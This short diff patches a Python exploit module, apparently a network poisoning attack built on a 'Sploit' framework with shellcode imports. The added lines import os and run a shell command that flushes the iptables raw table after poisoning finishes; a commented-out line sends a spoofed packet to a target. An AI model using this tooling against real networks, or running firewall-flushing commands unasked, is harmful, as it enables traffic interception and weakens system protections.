@@ -1,7 +1,7 @@
 from Sploit import Sploit
 from collections import OrderedDict
 from shellcodes.Shellcodes import OSShellcodes
-import sys
+import sys,os
 import argparse
 import threading
 import time
@@ -117,6 +117,7 @@ class exploit(Sploit):
 				sys.exit(1)
 			pause(2)
 		self.log('[!] Poison finished')
+		os.system('iptables -F -vt raw')
 		#send(IP(src='1.2.3.4',dst=targets[0]),iface=self.interface)
 		#x.join()
 		self.log('[-] Fixing Targets...')
